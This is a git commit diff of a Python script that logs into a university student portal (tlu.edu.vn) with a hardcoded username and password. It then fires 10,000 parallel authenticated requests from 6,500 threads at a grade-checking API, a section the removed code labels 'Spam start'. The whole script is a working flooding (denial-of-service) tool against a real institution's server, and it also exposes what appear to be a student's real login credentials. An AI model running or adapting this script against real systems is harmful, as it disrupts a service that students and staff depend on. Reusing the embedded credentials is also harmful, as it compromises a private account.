30feb29f8dc2cb4a1b274cc7dfc60b008b3e2daa
duogglong <nduonglong02@gmail.com>
2023-12-29 17:59:15 +0700

    fix timeout login

--- Noasync.py
+++ Noasync.py
@@ -1,47 +1,60 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
 
-urlLogin = "https://sinhvien1.tlu.edu.vn:8098/education/oauth/token"
+def login():
+    url_login = "https://sinhvien1.tlu.edu.vn:8098/education/oauth/token"
 
-dataRequestLogin = {
-    "client_id": "education_client",
-    "grant_type": "password",
-    "username": "2151183845",
-    "password": "001303037558",
-    "client_secret": "password"
-}
+    data_request_login = {
+        "client_id": "education_client",
+        "grant_type": "password",
+        "username": "2151183845",
+        "password": "001303037558",
+        "client_secret": "password"
+    }
 
-response = requests.post(urlLogin, data=dataRequestLogin)
-response.raise_for_status()  # Raise an HTTPError for bad responses
+    try:
+        response = requests.post(url_login, data=data_request_login, timeout=15)  # Set a timeout if needed
+        response.raise_for_status()
 
-access_token = response.json().get("access_token")
-print(f"Access Token: {access_token}")
+        access_token = response.json().get("access_token")
+        print(f"Access Token: {access_token}")
 
-# Spam start
-url = "https://sinhvien1.tlu.edu.vn:8098/education/api/studentsubjectmark/checkFinishedEducationProgramOfStudent/tree/studentId/127"
-headers = {
-    "Authorization": "Bearer " + access_token
-}
+        return access_token
+    except requests.exceptions.RequestException as e:
+        print(f"Error during login")
+        return None
 
-# Function to make a single request
-def make_request(_):
+def make_request(access_token, _):
+    url = "https://sinhvien1.tlu.edu.vn:8098/education/api/studentsubjectmark/checkFinishedEducationProgramOfStudent/tree/studentId/127"
+    headers = {
+        "Authorization": "Bearer " + access_token
+    }
+
     print("aaa")
     try:
-        requests.get(url, headers=headers, timeout=2)  # Set a timeout if needed 2s
+        requests.get(url, headers=headers, timeout=2)
     except requests.exceptions.RequestException as e:
         # Log the exception or do nothing to ignore the error
         pass
 
-# Number of parallel requests
-num_requests = 10000
+def main():
+    access_token = login()
+    if access_token is None:
+        print("Login failed. Exiting.")
+        return
+    
+    # Number of parallel requests
+    num_requests = 10000
 
-# Set max_workers to a higher value
-max_workers = 6500
+    # Set max_workers to a higher value
+    max_workers = 6500
 
-# Use ThreadPoolExecutor to make asynchronous requests
-with ThreadPoolExecutor(max_workers=max_workers) as executor:
-    # Use submit instead of map to fire off asynchronous requests
-    futures = [executor.submit(make_request, _) for _ in range(num_requests)]
+    # Use ThreadPoolExecutor to make asynchronous requests
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Use submit instead of map to fire off asynchronous requests
+        futures = [executor.submit(make_request, access_token, _) for _ in range(num_requests)]
 
+    print("All requests submitted")
 
-print("All requests submitted")
+if __name__ == "__main__":
+    main()
